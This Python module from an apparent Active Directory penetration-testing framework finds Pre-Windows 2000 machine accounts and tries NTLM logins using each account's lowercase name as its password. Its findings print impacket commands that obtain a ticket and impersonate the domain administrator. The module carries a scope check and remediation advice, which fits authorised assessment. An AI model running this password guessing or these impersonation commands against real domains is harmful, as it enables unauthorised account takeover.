"""Pre-Windows 2000 computer accounts — default password equals lowercase computer name."""
from __future__ import annotations

import asyncio
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))

from common.base_module import BaseModule, ModuleResult
from common.evidence import Evidence
from common.finding import Severity
from adforge.core.ldap_client import LdapClient

CVSS_PRE2000 = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"
CVSS40_PRE2000 = "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H"
# UAC flags
UAC_PASSWD_NOT_REQUIRED  = 0x0020
UAC_USE_DES_KEY_ONLY     = 0x200000  # Set on Pre-Win2k accounts
UAC_WORKSTATION_TRUST    = 0x1000    # Machine account
UAC_SERVER_TRUST         = 0x2000    # DC
UAC_INTERDOMAIN_TRUST    = 0x0800


class Pre2000Computers(BaseModule):
    """Pre-Windows 2000 compatible machine accounts with predictable default passwords."""

    NAME        = "pre2000_computers"
    DESCRIPTION = (
        "Find machine accounts with PASSWORD_NOT_REQUIRED or USE_DES_KEY_ONLY — "
        "default password = lowercase(computername), exploitable unauthenticated"
    )
    PHASE       = 4
    TAGS        = ["attacks", "pre2000", "machine-accounts", "unauthenticated", "mitre-T1078.002"]

    async def run(self) -> ModuleResult:
        start  = time.monotonic()
        domain = self.config.extra.get("domain", "")
        dc_ip  = self.config.extra.get("dc", self.config.target)

        if not self.check_scope(dc_ip):
            return self._make_result(start, skipped=True, skip_reason="out of scope")

        client = LdapClient(
            dc_ip=dc_ip, domain=domain,
            username=self.config.extra.get("username", ""),
            password=self.config.extra.get("password", ""),
        )
        if not client.connect():
            return self._make_result(start)

        try:
            await self._find_pre2000_accounts(client, domain, dc_ip)
        finally:
            client.disconnect()

        return self._make_result(start)

    async def _find_pre2000_accounts(
        self, client: LdapClient, domain: str, dc_ip: str
    ) -> None:
        # Query 1: Accounts with PASSWORD_NOT_REQUIRED (0x0020) + machine account trust
        # This is the direct fingerprint of Pre-Win2k computer account creation
        pw_not_req = client.search(
            "(&(objectCategory=computer)"
            "(userAccountControl:1.2.840.113556.1.4.803:=32))",  # 32 = 0x0020
            ["sAMAccountName", "userAccountControl", "dNSHostName",
             "operatingSystem", "whenCreated", "lastLogonTimestamp"],
        )

        # Query 2: Accounts with USE_DES_KEY_ONLY (common on pre-2000 joined)
        des_only = client.search(
            "(&(objectCategory=computer)"
            "(userAccountControl:1.2.840.113556.1.4.803:=2097152))",  # 0x200000
            ["sAMAccountName", "userAccountControl", "dNSHostName"],
        )

        # Query 3: Members of "Pre-Windows 2000 Compatible Access" built-in group
        pre2k_group = client.search(
            "(cn=Pre-Windows 2000 Compatible Access)",
            ["member"],
        )
        pre2k_members: list[str] = []
        if pre2k_group:
            members_raw = pre2k_group[0].get("member", [])
            if isinstance(members_raw, str):
                members_raw = [members_raw]
            pre2k_members = [str(m) for m in members_raw]

        # Deduplicate by sAMAccountName
        seen: set[str] = set()
        vulnerable_accounts: list[dict] = []
        for account in pw_not_req + des_only:
            name = str(account.get("sAMAccountName", "")).rstrip("$")
            if name and name not in seen:
                seen.add(name)
                uac   = int(str(account.get("userAccountControl") or 0))
                # Exclude DCs
                if uac & UAC_SERVER_TRUST:
                    continue
                default_pw = name.lower()  # Pre-Win2k default password
                vulnerable_accounts.append({
                    "name":        name,
                    "default_pw":  default_pw,
                    "uac":         f"0x{uac:x}",
                    "dns":         str(account.get("dNSHostName") or ""),
                    "os":          str(account.get("operatingSystem") or ""),
                })

        # Flag the "Pre-Windows 2000 Compatible Access" group membership
        # (Everyone / Anonymous Logon in this group = serious risk)
        has_everyone = any(
            "S-1-1-0" in m or "everyone" in m.lower() or "anonymous" in m.lower()
            for m in pre2k_members
        )

        if has_everyone:
            ev = Evidence(extra={
                "group_members": pre2k_members[:10],
                "risk":          "Everyone/Anonymous in Pre-Windows 2000 Compatible Access",
            })
            self.new_finding(
                title="Pre-Windows 2000 Compatible Access Group Contains Everyone/Anonymous",
                severity=Severity.CRITICAL,
                description=(
                    "The 'Pre-Windows 2000 Compatible Access' built-in group contains "
                    "Everyone or Anonymous Logon. "
                    "This allows unauthenticated LDAP queries and potentially NULL session "
                    "access to AD objects, enabling full domain enumeration without credentials."
                ),
                reproduction_steps=[
                    f"ldapsearch -H ldap://{dc_ip} -x -b 'DC={'  ,'.join(domain.split('.'))}' "
                    "(objectClass=user) sAMAccountName",
                ],
                remediation=(
                    "Remove Everyone and Anonymous Logon from the "
                    "'Pre-Windows 2000 Compatible Access' group. "
                    "This group should be empty or contain only specific legacy systems."
                ),
                references=["MITRE T1078.002", "CIS AD Benchmark"],
                evidence=ev,
                cvss_v31_vector=CVSS_PRE2000,
                cvss_v40_vector=CVSS40_PRE2000,
                mitre_attack=["TA0001/T1078.002"],
                target=dc_ip,
            )

        if vulnerable_accounts:
            # Attempt to verify default passwords on a sample (rate-limited, no lockout risk
            # because these accounts typically have no lockout policy)
            verified: list[str] = []
            for acct in vulnerable_accounts[:5]:
                await self.rate_limit()
                if await self._try_default_password(
                    dc_ip, domain, acct["name"] + "$", acct["default_pw"]
                ):
                    verified.append(acct["name"])

            ev = Evidence(extra={
                "vulnerable_accounts": [a["name"] for a in vulnerable_accounts],
                "sample_credentials":  [
                    {"account": a["name"] + "$", "password": a["default_pw"]}
                    for a in vulnerable_accounts[:5]
                ],
                "verified_working":    verified,
            })
            self.new_finding(
                title=f"Pre-Windows 2000 Machine Accounts — {len(vulnerable_accounts)} Accounts "
                      f"with Predictable Passwords",
                severity=Severity.CRITICAL if verified else Severity.HIGH,
                description=(
                    f"{len(vulnerable_accounts)} machine account(s) were created with the "
                    "'Add computer to domain as Pre-Windows 2000 compatible' option, "
                    "setting their password to lowercase(computername) (without $).\n\n"
                    f"{'CONFIRMED: ' + str(len(verified)) + ' password(s) verified working.' if verified else 'Sample attempted — verify manually.'}\n\n"
                    "Exploitation: authenticate as the machine account → "
                    "request Kerberos TGT → perform Kerberoast, S4U2Self, or RBCD attacks "
                    "depending on the account's privileges."
                ),
                reproduction_steps=[
                    "# Verify default password (computer$ : computername):",
                    f"impacket-getTGT {domain}/COMPUTER$:computername -dc-ip {dc_ip}",
                    "export KRB5CCNAME=COMPUTER$.ccache",
                    "# Then escalate via RBCD or S4U2Self if applicable",
                    f"impacket-getST -spn host/dc.{domain} -impersonate administrator "
                    f"{domain}/COMPUTER$ -hashes :<nthash> -dc-ip {dc_ip}",
                ],
                remediation=(
                    "Reset passwords on all identified accounts immediately. "
                    "Disable accounts that are no longer needed. "
                    "Enable account lockout on machine accounts if possible. "
                    "Use modern domain join (not Pre-Windows 2000 option)."
                ),
                references=[
                    "MITRE T1078.002",
                    "https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts/",
                ],
                evidence=ev,
                cvss_v31_vector=CVSS_PRE2000,
                cvss_v40_vector=CVSS40_PRE2000,
                mitre_attack=["TA0001/T1078.002", "TA0006/T1078"],
                target=dc_ip,
            )

    async def _try_default_password(
        self, dc_ip: str, domain: str, account: str, password: str
    ) -> bool:
        """Test if machine account accepts its lowercase-name as password."""
        try:
            from ldap3 import Server, Connection, NTLM, ALL
            server = Server(dc_ip, get_info=ALL, connect_timeout=5)
            upn    = f"{account}@{domain}"
            conn   = Connection(
                server, user=upn, password=password,
                authentication=NTLM, raise_exceptions=False, receive_timeout=5
            )
            result = conn.bind()
            conn.unbind()
            return result
        except Exception:
            return False


class TestPre2000Computers:
    def test_uac_flags(self) -> None:
        assert UAC_PASSWD_NOT_REQUIRED == 0x0020
        assert UAC_USE_DES_KEY_ONLY    == 0x200000

    def test_cvss(self) -> None:
        assert CVSS_PRE2000.startswith("CVSS:3.1")
